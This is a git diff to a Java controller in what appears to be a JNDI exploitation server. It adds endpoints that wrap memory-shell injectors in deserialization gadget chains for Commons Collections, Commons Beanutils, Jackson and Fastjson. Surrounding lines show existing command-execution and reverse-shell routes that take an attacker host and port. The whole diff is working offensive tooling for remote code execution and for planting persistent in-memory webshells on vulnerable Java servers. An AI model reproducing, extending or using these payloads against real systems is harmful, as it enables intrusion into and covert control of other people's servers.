@@ -1,8 +1,10 @@
 package map.jndi.controller;
 
+import com.reajason.javaweb.memshell.config.GenerateResult;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import map.jndi.annotation.JNDIController;
 import map.jndi.annotation.JNDIMapping;
-import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import map.jndi.payload.MemShellPayload;
 import map.jndi.gadget.*;
 
 import java.nio.file.Files;
@@ -54,6 +56,18 @@ public class DeserializeController implements Controller {
         return data;
     }
 
+    @JNDIMapping("/CommonsCollectionsK1/MemShell/{server}/{tool}/{type}")
+    public byte[] CommonsCollectionsK1MemShell(String server, String tool, String type) throws Exception {
+        System.out.println("[Deserialize] [CommonsCollectionsK1] [MemShell]: Server: " + server + " Tool: " + tool + " Type: " + type);
+
+        GenerateResult result = MemShellPayload.generate(server, tool, type);
+        MemShellPayload.printInfo(result);
+
+        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(result.getInjectorBytes());
+        byte[] data = CommonsCollectionsK1.create(templatesImpl);
+        return data;
+    }
+
     @JNDIMapping("/CommonsCollectionsK2/Command/{cmd}")
     public byte[] CommonsCollectionsK2Cmd(String cmd) throws Exception {
         System.out.println("[Deserialize] [CommonsCollectionsK2] [Command] Cmd: " + cmd);
@@ -68,6 +82,18 @@ public class DeserializeController implements Controller {
         System.out.println("[Deserialize] [CommonsCollectionsK2] [ReverseShell] Host: " + host + " Port: " + port);
 
         TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(host, Integer.parseInt(port));
+        byte[] data = CommonsCollectionsK2.create(templatesImpl);
+        return data;
+    }
+
+    @JNDIMapping("/CommonsCollectionsK2/MemShell/{server}/{tool}/{type}")
+    public byte[] CommonsCollectionsK2MemShell(String server, String tool, String type) throws Exception {
+        System.out.println("[Deserialize] [CommonsCollectionsK2] [MemShell]: Server: " + server + " Tool: " + tool + " Type: " + type);
+
+        GenerateResult result = MemShellPayload.generate(server, tool, type);
+        MemShellPayload.printInfo(result);
+
+        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(result.getInjectorBytes());
         byte[] data = CommonsCollectionsK2.create(templatesImpl);
         return data;
     }
@@ -106,6 +132,18 @@ public class DeserializeController implements Controller {
         return data;
     }
 
+    @JNDIMapping("/CommonsBeanutils183/MemShell/{server}/{tool}/{type}")
+    public byte[] CommonsBeanutils183MemShell(String server, String tool, String type) throws Exception {
+        System.out.println("[Deserialize] [CommonsBeanutils183] [MemShell]: Server: " + server + " Tool: " + tool + " Type: " + type);
+
+        GenerateResult result = MemShellPayload.generate(server, tool, type);
+        MemShellPayload.printInfo(result);
+
+        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(result.getInjectorBytes());
+        byte[] data = CommonsBeanutils.create(templatesImpl, "commons-beanutils-1.8.3.jar");
+        return data;
+    }
+
     @JNDIMapping("/CommonsBeanutils194/Command/{cmd}")
     public byte[] CommonsBeanutils194Cmd(String cmd) throws Exception {
         System.out.println("[Deserialize] [CommonsBeanutils194] [Command] Cmd: " + cmd);
@@ -120,6 +158,18 @@ public class DeserializeController implements Controller {
         System.out.println("[Deserialize] [CommonsBeanutils194] [ReverseShell] Host: " + host + " Port: " + port);
 
         TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(host, Integer.parseInt(port));
+        byte[] data = CommonsBeanutils.create(templatesImpl, "commons-beanutils-1.9.4.jar");
+        return data;
+    }
+
+    @JNDIMapping("/CommonsBeanutils194/MemShell/{server}/{tool}/{type}")
+    public byte[] CommonsBeanutils194MemShell(String server, String tool, String type) throws Exception {
+        System.out.println("[Deserialize] [CommonsBeanutils194] [MemShell]: Server: " + server + " Tool: " + tool + " Type: " + type);
+
+        GenerateResult result = MemShellPayload.generate(server, tool, type);
+        MemShellPayload.printInfo(result);
+
+        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(result.getInjectorBytes());
         byte[] data = CommonsBeanutils.create(templatesImpl, "commons-beanutils-1.9.4.jar");
         return data;
     }
@@ -142,6 +192,18 @@ public class DeserializeController implements Controller {
         return data;
     }
 
+    @JNDIMapping("/Jackson/MemShell/{server}/{tool}/{type}")
+    public byte[] JacksonMemShell(String server, String tool, String type) throws Exception {
+        System.out.println("[Deserialize] [Jackson] [MemShell]: Server: " + server + " Tool: " + tool + " Type: " + type);
+
+        GenerateResult result = MemShellPayload.generate(server, tool, type);
+        MemShellPayload.printInfo(result);
+
+        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(result.getInjectorBytes());
+        byte[] data = Jackson.create(templatesImpl);
+        return data;
+    }
+
     @JNDIMapping("/Fastjson1/Command/{cmd}")
     public byte[] Fastjson1Cmd(String cmd) throws Exception {
         System.out.println("[Deserialize] [Fastjson1] [Command] Cmd: " + cmd);
@@ -160,6 +222,18 @@ public class DeserializeController implements Controller {
         return data;
     }
 
+    @JNDIMapping("/Fastjson1/MemShell/{server}/{tool}/{type}")
+    public byte[] Fastjson1MemShell(String server, String tool, String type) throws Exception {
+        System.out.println("[Deserialize] [Fastjson1] [MemShell]: Server: " + server + " Tool: " + tool + " Type: " + type);
+
+        GenerateResult result = MemShellPayload.generate(server, tool, type);
+        MemShellPayload.printInfo(result);
+
+        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(result.getInjectorBytes());
+        byte[] data = Fastjson1.create(templatesImpl);
+        return data;
+    }
+
     @JNDIMapping("/Fastjson2/Command/{cmd}")
     public byte[] Fastjson2Cmd(String cmd) throws Exception {
         System.out.println("[Deserialize] [Fastjson2] [Command] Cmd: " + cmd);
@@ -174,6 +248,18 @@ public class DeserializeController implements Controller {
         System.out.println("[Deserialize] [Fastjson2] [ReverseShell] Host: " + host + " Port: " + port);
 
         TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(host, Integer.parseInt(port));
+        byte[] data = Fastjson2.create(templatesImpl);
+        return data;
+    }
+
+    @JNDIMapping("/Fastjson2/MemShell/{server}/{tool}/{type}")
+    public byte[] Fastjson2MemShell(String server, String tool, String type) throws Exception {
+        System.out.println("[Deserialize] [Fastjson2] [MemShell]: Server: " + server + " Tool: " + tool + " Type: " + type);
+
+        GenerateResult result = MemShellPayload.generate(server, tool, type);
+        MemShellPayload.printInfo(result);
+
+        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(result.getInjectorBytes());
         byte[] data = Fastjson2.create(templatesImpl);
         return data;
     }
